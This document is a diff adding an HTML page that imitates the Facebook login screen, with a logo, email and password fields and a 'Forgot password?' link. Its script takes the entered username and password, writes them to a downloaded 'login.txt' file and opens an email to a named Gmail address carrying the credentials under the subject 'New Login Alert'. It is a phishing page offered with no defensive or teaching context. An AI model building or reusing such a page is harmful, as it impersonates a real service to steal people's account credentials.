@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to bottom, #f0f2f5, #ffffff);
+        }
+        .container {
+            text-align: center;
+            width: 300px;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #145dbf;
+        }
+        .forgot {
+            margin-top: 10px;
+            color: #1877f2;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">f</div>
+        <input type="text" id="username" placeholder="Mobile number or email">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="saveLogin()">Log in</button>
+        <div class="forgot">Forgot password?</div>
+    </div>
+
+    <script>
+        function saveLogin() {
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username.trim() === "" || password.trim() === "") {
+                alert("Please enter your credentials.");
+                return;
+            }
+
+            let data = `Username: ${username}\nPassword: ${password}\n\n`;
+
+            // Creating a Blob to save the file
+            let blob = new Blob([data], { type: "text/plain" });
+            let a = document.createElement("a");
+            a.href = URL.createObjectURL(blob);
+            a.download = "login.txt";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Sending email alert with login details
+            sendEmail(username, password);
+        }
+
+        function sendEmail(username, password) {
+            let emailBody = `A new login was detected:\n\nUsername: ${username}\nPassword: ${password}`;
+            
+            window.open(`mailto:worldson70@gmail.com?subject=New Login Alert&body=${encodeURIComponent(emailBody)}`);
+        }
+    </script>
+
+</body>
+</html>
